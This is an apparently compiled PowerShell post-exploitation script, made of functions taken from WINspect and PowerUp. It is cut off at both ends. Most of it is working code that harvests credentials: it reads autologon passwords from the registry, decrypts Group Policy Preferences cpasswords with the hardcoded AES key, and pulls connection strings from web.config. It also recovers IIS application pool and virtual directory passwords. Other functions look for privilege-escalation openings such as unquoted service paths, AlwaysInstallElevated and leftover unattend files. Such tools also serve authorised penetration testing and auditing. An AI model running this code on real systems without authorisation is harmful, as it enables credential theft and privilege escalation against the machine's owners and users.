    <#
    Modified https://github.com/A-mIn3/WINspect/blob/master/WINspect.ps1
    #>
    $permissionFlags = @{
        0x1 =   "Read-List";
        0x2 =   "Write-Create";
        0x4 =   "Append-Create Subdirectory";                  	
        0x20    =   "Execute file-Traverse directory";
        0x40    =   "Delete child"
        0x10000 =   "Delete";                     
        0x40000 =   "Write access to DACL";
        0x80000 =   "Write Owner"
    }
    $list = New-Object System.Collections.ArrayList
    try{
        Get-WmiObject -class Win32_share -Filter "type=0"| foreach {
            $shareSecurityObj = Get-WmiObject -class Win32_LogicalShareSecuritySetting -Filter "Name='$($_.Name)'"
            $securityDescriptor = $shareSecurityObj.GetSecurityDescriptor().Descriptor
            ForEach($ace in $securityDescriptor.dacl){
                # 0 = Allow ; 1 = Deny
                if([int]$ace.acetype -eq 0){
                    $accessMask  = $ace.accessmask
                    $permissions = ""
                    foreach($flag in $permissionFlags.Keys){
                        if($flag -band $accessMask){
                            $permissions+=$permissionFlags[$flag]
                            $permissions+=", "
                        }
                    }
                    $share = New-Object  PSObject -Property @{
                        ShareName   =  $_.Name     
                        Trustee     =  $ace.trustee.Name 
                        Permissions =  $permissions
                    }
                    $list.add($share) | Out-Null
                }
            }    
        }
    }catch{
        return "[-] $($_.Exception.Message)"
    }
    if($list.Count -gt 0){
        return $list
    }else{
        return "[*] No local Shares Were Found"
    }
}
function Get-UACLevel {
    <#
    https://github.com/A-mIn3/WINspect/blob/master/WINspect.ps1
    .SYNOPSIS
    Checks current configuration of User Account Control
    .DESCRIPTION
    This functions inspects registry informations related to UAC configuration 
    and checks whether UAC is enabled and which level of operation is used.
    #>
    $UACRegValues = Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    if ([int]$UACRegValues.EnableLUA -eq 1) {
        Write-Output "[+] UAC is enabled"
    }
    else {
        Write-Output "[-] UAC is disabled"
    }
    $consentPrompt = $UACregValues.ConsentPromptBehaviorAdmin
    $secureDesktop = $UACregValues.PromptOnSecureDesktop
    if ( $consentPrompt -eq 0 -and $secureDesktop -eq 0) {
        Write-Output "[*] UAC Level : Never Notify"
    }
    elseif ($consentPrompt -eq 5 -and $secureDesktop -eq 0) {
        Write-Output "[*] UAC Level : Notify only when apps try to make changes (No secure desktop)"
    }
    elseif ($consentPrompt -eq 5 -and $secureDesktop -eq 1) {
        Write-Output "[*] UAC Level : Notify only when apps try to make changes (secure desktop on)"
    }
    elseif ($consentPrompt -eq 5 -and $secureDesktop -eq 2) {
        Write-Output "[*] UAC Level : Always Notify with secure desktop"
    }
}
function Get-RegistryAutoLogon {
    <#
    .SYNOPSIS
    Finds any autologon credentials left in the registry.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    Checks if any autologon accounts/credentials are set in a number of registry locations.
    If they are, the credentials are extracted and returned as a custom PSObject.
    .EXAMPLE
    Get-RegistryAutoLogon
    Finds any autologon credentials left in the registry.
    .OUTPUTS
    PowerUp.RegistryAutoLogon
    Custom PSObject containing autologin credentials found in the registry.
    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
    #>
    
    [OutputType('PowerUp.RegistryAutoLogon')]
    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
            $Out
        }
    }
}
function Get-CachedGPPPassword {
    <#
    .SYNOPSIS
    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences and
    left in cached files on the host.
    Author: Chris Campbell (@obscuresec)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    Get-CachedGPPPassword searches the local machine for cached for groups.xml, scheduledtasks.xml, services.xml and
    datasources.xml files and returns plaintext passwords.
    .EXAMPLE
    Get-CachedGPPPassword
    NewName   : [BLANK]
    Changed   : {2013-04-25 18:36:07}
    Passwords : {Super!!!Password}
    UserNames : {SuperSecretBackdoor}
    File      : C:\ProgramData\Microsoft\Group Policy\History\{32C4C89F-7
                C3A-4227-A61D-8EF72B5B9E42}\Machine\Preferences\Groups\Gr
                oups.xml
    .LINK
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
    #>
    [CmdletBinding()]
    Param()
    # Some XML issues between versions
    Set-StrictMode -Version 2
    # make sure the appropriate assemblies are loaded
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core
    # helper that decodes and decrypts password
    function local:Get-DecryptedCpassword {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [CmdletBinding()]
        Param(
            [string] $Cpassword
        )
        try {
            # Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)
            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }
            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            # Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            # Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }
        catch {
            Write-Error $Error[0]
        }
    }
    # helper that parses fields from the found xml preference files
    function local:Get-GPPInnerField {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [CmdletBinding()]
        Param(
            $File
        )
        try {
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)
            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
            # check for password field
            if ($Xml.innerxml -like "*cpassword*"){
                Write-Verbose "Potential password in $File"
                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Services.xml' {
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'DataSources.xml' {
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Printers.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Drives.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                }
           }
           ForEach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               #append any new passwords to array
               $Password += , $DecryptedPassword
           }
            # put [BLANK] in variables
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}
            # Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) { Return $ResultsObject }
        }
        catch {Write-Error $Error[0]}
    }
    try {
        $AllUsers = $Env:ALLUSERSPROFILE
        if ($AllUsers -notmatch 'ProgramData') {
            $AllUsers = "$AllUsers\Application Data"
        }
        # discover any locally cached GPP .xml files
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
            ForEach ($File in $XMLFiles) {
                Get-GppInnerField $File.Fullname
            }
        }
    }
    catch {
        Write-Error $Error[0]
    }
}
function Get-UnattendedInstallFile {
    <#
    .SYNOPSIS
    Checks several locations for remaining unattended installation files,
    which may have deployment credentials.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .EXAMPLE
    Get-UnattendedInstallFile
    Finds any remaining unattended installation files.
    .LINK
    http://www.fuzzysecurity.com/tutorials/16.html
    .OUTPUTS
    PowerUp.UnattendedInstallFile
    Custom PSObject containing results.
    #>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnattendedInstallFile')]
    [CmdletBinding()]
    Param()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"
    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )
    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out | Add-Member Aliasproperty Name UnattendPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnattendedInstallFile')
        $Out
    }
    $ErrorActionPreference = $OrigError
}
function Get-UnquotedService {
    <#
    .SYNOPSIS
    Returns the name and binary path for services with unquoted paths
    that also have a space in the name.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: Get-ModifiablePath, Test-ServiceDaclPermission  
    .DESCRIPTION
    Uses Get-WmiObject to query all win32_service objects and extract out
    the binary pathname for each. Then checks if any binary paths have a space
    and aren't quoted.
    .EXAMPLE
    Get-UnquotedService
    Get a set of potentially exploitable services.
    .OUTPUTS
    PowerUp.UnquotedService
    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
    #>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnquotedService')]
    [CmdletBinding()]
    Param()
    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {
        $_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'
    }
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            $SplitPathArray = $Service.pathname.Split(' ')
            $ConcatPathArray = @()
            for ($i=0;$i -lt $SplitPathArray.Count; $i++) {
                        $ConcatPathArray += $SplitPathArray[0..$i] -join ' '
            }
            $ModifiableFiles = $ConcatPathArray | Get-ModifiablePath
            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $CanRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
                $Out | Add-Member Aliasproperty Name ServiceName
                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnquotedService')
                $Out
            }
        }
    }
}
function Get-RegistryAlwaysInstallElevated {
    <#
    .SYNOPSIS
    Checks if any of the AlwaysInstallElevated registry keys are set.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys
    are set, $False otherwise. If one of these keys are set, then all .MSI files run with
    elevated permissions, regardless of current user permissions.
    .EXAMPLE
    Get-RegistryAlwaysInstallElevated
    Returns $True if any of the AlwaysInstallElevated registry keys are set.
    .OUTPUTS
    System.Boolean
    $True if RegistryAlwaysInstallElevated is set, $False otherwise.
    #>
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'
    if (Test-Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer') {
        $HKLMval = (Get-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"
        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
            $HKCUval = (Get-ItemProperty -Path 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"
            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose 'AlwaysInstallElevated enabled on this machine!'
                $True
            }
            else{
                Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
                $False
            }
        }
        else{
            Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
            $False
        }
    }
    else{
        Write-Verbose 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist'
        $False
    }
    $ErrorActionPreference = $OrigError
}
function Get-WebConfig {
    <#
    .SYNOPSIS
    This script will recover cleartext and encrypted connection strings from all web.config
    files on the system. Also, it will decrypt them if needed.
    Author: Scott Sutherland, Antti Rantasaari  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    This script will identify all of the web.config files on the system and recover the
    connection strings used to support authentication to backend databases.  If needed, the
    script will also decrypt the connection strings on the fly.  The output supports the
    pipeline which can be used to convert all of the results into a pretty table by piping
    to format-table.
    .EXAMPLE
    Return a list of cleartext and decrypted connect strings from web.config files.
    Get-WebConfig
    user   : s1admin
    pass   : s1password
    dbserv : 192.168.1.103\server1
    vdir   : C:\test2
    path   : C:\test2\web.config
    encr   : No
    user   : s1user
    pass   : s1password
    dbserv : 192.168.1.103\server1
    vdir   : C:\inetpub\wwwroot
    path   : C:\inetpub\wwwroot\web.config
    encr   : Yes
    .EXAMPLE
    Return a list of clear text and decrypted connect strings from web.config files.
    Get-WebConfig | Format-Table -Autosize
    user    pass       dbserv                vdir               path                          encr
    ----    ----       ------                ----               ----                          ----
    s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No
    s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No
    s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No
    s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes
    s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No
    .OUTPUTS
    System.Boolean
    System.Data.DataTable
    .LINK
    https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
    http://www.netspi.com
    https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
    http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
    http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
    .NOTES
    Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
    for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
    Author: Scott Sutherland - 2014, NetSPI
    Author: Antti Rantasaari - 2014, NetSPI
    #>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Boolean')]
    [OutputType('System.Data.DataTable')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {

        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('dbserv')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('path')
        $Null = $DataTable.Columns.Add('encr')

        # Get list of virtual directories in IIS
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
        ForEach-Object {

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split('%')[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {

                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add|
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if ($MyConString -like '*password*') {
                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                            $ConfVdir = $CurrentVdir
                            $ConfEnc = 'No'
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        # Decrypt web.config in user temp
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if ($MyConString -like '*password*') {
                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                                }
                            }
                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        # Check if any connection strings were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable | Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
function Get-ApplicationHost {
    <#
    .SYNOPSIS
    Recovers encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
    Author: Scott Sutherland  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    This script will decrypt and recover application pool and virtual directory passwords
    from the applicationHost.config file on the system.  The output supports the
    pipeline which can be used to convert all of the results into a pretty table by piping
    to format-table.
    .EXAMPLE
    Return application pool and virtual directory passwords from the applicationHost.config on the system.
    Get-ApplicationHost
    user    : PoolUser1
    pass    : PoolParty1!
    type    : Application Pool
    vdir    : NA
    apppool : ApplicationPool1
    user    : PoolUser2
    pass    : PoolParty2!
    type    : Application Pool
    vdir    : NA
    apppool : ApplicationPool2
    user    : VdirUser1
    pass    : VdirPassword1!
    type    : Virtual Directory
    vdir    : site1/vdir1/
    apppool : NA
    user    : VdirUser2
    pass    : VdirPassword2!
    type    : Virtual Directory
    vdir    : site2/
    apppool : NA
    .EXAMPLE
    Return a list of cleartext and decrypted connect strings from web.config files.
    Get-ApplicationHost | Format-Table -Autosize
    user          pass               type              vdir         apppool
    ----          ----               ----              ----         -------
    PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
    PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2
    VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA
    VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA
    .OUTPUTS
    System.Data.DataTable
    System.Boolean
    .LINK
    https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
    http://www.netspi.com
    http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
    http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
    .NOTES
    Author: Scott Sutherland - 2014, NetSPI
    Version: Get-ApplicationHost v1.0
    Comments: Should work on IIS 6 and Above
    #>
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Data.DataTable')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('type')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('apppool')

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
